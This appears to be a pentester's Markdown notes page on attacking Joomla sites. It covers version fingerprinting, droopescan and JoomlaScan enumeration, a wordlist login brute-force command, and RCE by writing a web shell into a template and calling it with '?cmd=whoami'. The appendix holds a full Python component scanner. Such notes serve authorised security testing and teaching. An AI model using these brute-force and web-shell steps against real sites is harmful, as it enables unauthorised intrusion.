### Content

- [Enumeration](#enumeration)
	- [Manual](#manual)
	- [Automated](#automated)
- [Attacks](#attacks)
	- [Login Brute Force](#login-brute-force)
	- [RCE](#rce)
		- [Abusing Templates](#abusing-templates)
- [Appendix](#appendix)
	- [joomlascan](#joomlascan)

> [!Note]
> 
>  - See `/robots.txt`, `/joomla/robots.txt`
>  - Login Portal: `/administrator`
>  - In case of receive "An error has occurred. Call to a member function format() on null" after logging in
> 	 - Navigate to `/administrator/index.php?option=com_plugins`
> 	 - Disable the "Quick Icon - PHP Version Check" plugin. 

---
### Enumeration
##### Manual

```bash
# Footprinting and discovering joomla
$ curl -s http://FQDN/ | grep Joomla

# Joomla version
# README.txt (but not always available)
$ curl -s http://FQDN/README.txt | head -n 5
# Browsing JS files in media/system/js/ directory can show the version
# administrator/manifests/files/joomla.xml
$ curl -s http://FQDN/administrator/manifests/files/joomla.xml | xmllint --format -
# Browsing plugins/system/cache/cache.xml can help to give us the approximate version.
```

##### Automated

Installing and using `droopescan`

```bash
git clone https://github.com/droope/droopescan.git
cd droopescan
# Replace the following
# In the Dockerfile {"FROM python:3" : "FROM python:3.7-slim"}
# In the setup.py {"pystache" : "pystache==0.5.4"}
sudo docker build -t droope/droopescan .

# Scanning a website
sudo docker run --rm --add-host=<FQDN>:<IP> droope/droopescan scan joomla --url http://<FQDN>/
```

Using [joomlascan](#joomlascan) to find accessible directories and files which may help with fingerprinting installed extensions.

```bash
$ ./joomlascan.py -u http://FQDN -t 200
```

---
### Attacks
#### Login Brute Force

Login brute force using this [script](https://github.com/ajnik/joomla-bruteforce)

```bash
./joomla-brute.py -u http://FQDN -usr admin -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -v
```

#### RCE
##### Abusing Templates

Open `Extensions` in the top bar, then `Templates`, then `Templates` again to view the available templates, click on one of them to edit its content, choose a file to write the web shell into it.
<img src="/assets/joomla_rce_template_abuse.png" style="display: block; margin:auto; height:500;">
Then access the file

```bash
$ curl -s 'http://FQDN/templates/protostar/error.php?cmd=whoami'
www-data
```

---
### Appendix
###### joomlascan

The main script [JoomlaScan](https://github.com/drego85/JoomlaScan) is a Python tool inspired by the now-defunct OWASP [joomscan](https://github.com/OWASP/joomscan) tool.
With the help of AI, generated the python3 version of it: 

```python
#!/usr/bin/env python3
"""
Joomla Component Scanner - Modern Python 3 rewrite
Original by Andrea Draghetti | Modernized for Python 3.8+
"""

import sys
import http.client  # replaces Python 2's httplib
import requests
import argparse
import threading
import time
import logging
from typing import Optional

# ── Logging setup ──────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[logging.StreamHandler(sys.stdout)],
)
log = logging.getLogger(__name__)

# ── Constants ──────────────────────────────────────────────────────────────────
SW_VERSION = "0.6"
TIMEOUT = 5
HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; "
        "WOW64; Trident/6.0)"
    ),
    "Accept-Language": "it",
}


# ══════════════════════════════════════════════════════════════════════════════
class JoomlaScanner:
    """Encapsulates all scanner state so nothing leaks into module globals."""

    def __init__(self, url: str, threads: int = 10) -> None:
        self.url = url.rstrip("/")
        self.db: list[str] = []
        self.pool = threading.BoundedSemaphore(threads)
        self.threads = threads

    # ── Database ───────────────────────────────────────────────────────────────
    def load_components(self, path: str = "comptotestdb.txt") -> None:
        """Load the component list from disk."""
        try:
            with open(path, "r") as fh:
                self.db = [line.strip() for line in fh if line.strip()]
            log.info(f"[+] Loaded {len(self.db)} components from {path}")
        except FileNotFoundError:
            log.error(f"[!] Component database not found: {path}")
            sys.exit(1)

    # ── Low-level HTTP helpers ─────────────────────────────────────────────────
    def _get_status(self, path: str = "/") -> Optional[int]:
        """
        GET request → HTTP status code, or None on error.
        Returns 404 when content-length is 0 (empty response trick).
        """
        try:
            resp = requests.get(
                self.url + path, headers=HEADERS, timeout=TIMEOUT
            )
            content_length = resp.headers.get("content-length", "1")
            return resp.status_code if content_length != "0" else 404
        except Exception:
            return None

    def _head_content_length(self, path: str = "/") -> Optional[str]:
        """HEAD request → Content-Length header value, or None on error."""
        try:
            resp = requests.head(
                self.url + path, headers=HEADERS, timeout=TIMEOUT
            )
            return resp.headers.get("content-length")
        except Exception:
            return None

    def _is_index_of(self, path: str = "/") -> bool:
        """Return True if the page title contains 'Index of /' (open directory)."""
        try:
            from bs4 import BeautifulSoup

            resp = requests.get(
                self.url + path, headers=HEADERS, timeout=TIMEOUT
            )
            soup = BeautifulSoup(resp.text, "html.parser")
            title = soup.title.string if soup.title else ""
            return "Index of /" in (title or "")
        except Exception:
            return False

    # ── Per-component file checks ──────────────────────────────────────────────
    def _check_file(
        self, component: str, subpath: str, label: str
    ) -> None:
        """Generic helper: probe a path and log it if it returns HTTP 200."""
        for base in (
            f"/components/{component}",
            f"/administrator/components/{component}",
        ):
            full = f"{base}/{subpath}"
            if self._get_status(full) == 200:
                log.info(f"\t {label} found\t > {self.url}{full}")

    def check_readme(self, component: str) -> None:
        for name in ("README.txt", "readme.txt", "README.md", "readme.md"):
            self._check_file(component, name, "README file")

    def check_license(self, component: str) -> None:
        for name in ("LICENSE.txt", "license.txt"):
            self._check_file(component, name, "LICENSE file")
        # XML manifest variant (strip leading "com_")
        xml_name = f"{component[4:]}.xml"
        self._check_file(component, xml_name, "LICENSE file")

    def check_changelog(self, component: str) -> None:
        for name in ("CHANGELOG.txt", "changelog.txt"):
            self._check_file(component, name, "CHANGELOG file")

    def check_manifest(self, component: str) -> None:
        for name in ("MANIFEST.xml", "manifest.xml"):
            self._check_file(component, name, "MANIFEST file")

    def check_index_files(self, component: str) -> None:
        """
        Check for descriptive index files (content-length > 1 000 bytes).

        BUG FIX: the original called an undefined `check_url_head()` function.
        Replaced with `_head_content_length()` which is actually defined.
        """
        for base in (
            f"/components/{component}",
            f"/administrator/components/{component}",
        ):
            for name in ("index.htm", "index.html", "INDEX.htm", "INDEX.html"):
                path = f"{base}/{name}"
                raw_len = self._head_content_length(path)
                try:
                    length = int(raw_len or 0)
                except ValueError:
                    length = 0
                if length > 1000:
                    log.info(
                        f"\t INDEX file (descriptive) found\t > {self.url}{path}"
                    )

    # ── Main scan worker (runs in its own thread) ──────────────────────────────
    def _scan_component(self, component: str) -> None:
        try:
            found_via_option = self._get_status(f"/index.php?option={component}") == 200
            found_via_comp   = self._get_status(f"/components/{component}/") == 200
            found_via_admin  = self._get_status(f"/administrator/components/{component}/") == 200

            if found_via_option:
                log.info(
                    f"Component found: {component}\t > "
                    f"{self.url}/index.php?option={component}"
                )
            elif found_via_comp:
                log.info(
                    f"Component found: {component}\t > "
                    f"{self.url}/index.php?option={component}"
                )
                log.info("\t But possibly it is not active or protected")
            elif found_via_admin:
                log.info(
                    f"Component found: {component}\t > "
                    f"{self.url}/index.php?option={component}"
                )
                log.info("\t On the administrator components")
            else:
                return  # component not present — nothing to report

            # Common disclosure checks
            self.check_readme(component)
            self.check_license(component)
            self.check_changelog(component)
            self.check_manifest(component)
            self.check_index_files(component)

            # Open directory checks
            for dir_path in (
                f"/components/{component}/",
                f"/administrator/components/{component}/",
            ):
                if self._is_index_of(dir_path):
                    log.info(f"\t Explorable Directory\t > {self.url}{dir_path}")

        finally:
            self.pool.release()  # always release, even on exception

    # ── Entry point ────────────────────────────────────────────────────────────
    def run(self) -> None:
        """Run preliminary checks then spawn scanner threads for each component."""
        # Site availability sanity check
        if self._get_status("/") == 404:
            log.error("[!] Site appears to be down. Check the URL and try again.")
            sys.exit(1)

        # Quick wins: robots.txt and error_log
        if self._get_status("/robots.txt") == 200:
            log.info(f"[+] Robots file found:\t\t > {self.url}/robots.txt")
        else:
            log.info("[-] No robots.txt found")

        if self._get_status("/error_log") == 200:
            log.info(f"[+] Error log found:\t\t > {self.url}/error_log")
        else:
            log.info("[-] No error_log found")

        log.info(f"\n[*] Starting scan with {self.threads} concurrent threads...\n")

        for component in self.db:
            self.pool.acquire(blocking=True)
            t = threading.Thread(
                target=self._scan_component,
                args=(component,),
                daemon=True,
            )
            t.start()

        # Wait for all threads to finish
        while threading.active_count() > 1:
            time.sleep(0.1)

        log.info("\n[*] Scan complete.")


# ══════════════════════════════════════════════════════════════════════════════
def banner(db_size: int) -> None:
    print("─" * 50)
    print("            Joomla Component Scanner")
    print(f"   Version {SW_VERSION}  ·  Database entries: {db_size}")
    print("        Original by Andrea Draghetti")
    print("─" * 50)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Scan a Joomla installation for installed components."
    )
    parser.add_argument(
        "-u", "--url",
        required=True,
        dest="url",
        help="Target Joomla URL (must include http:// or https://)",
    )
    parser.add_argument(
        "-t", "--threads",
        type=int,           # argparse now enforces the type itself
        default=10,
        dest="threads",
        help="Number of concurrent threads (default: 10)",
    )
    parser.add_argument(
        "-v", "--version",
        action="version",
        version=f"%(prog)s {SW_VERSION}",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    url = args.url
    if not url.startswith(("http://", "https://")):
        print("[!] URL must include http:// or https://")
        sys.exit(1)

    scanner = JoomlaScanner(url=url, threads=args.threads)
    scanner.load_components()
    banner(len(scanner.db))
    scanner.run()


if __name__ == "__main__":
    main()
```
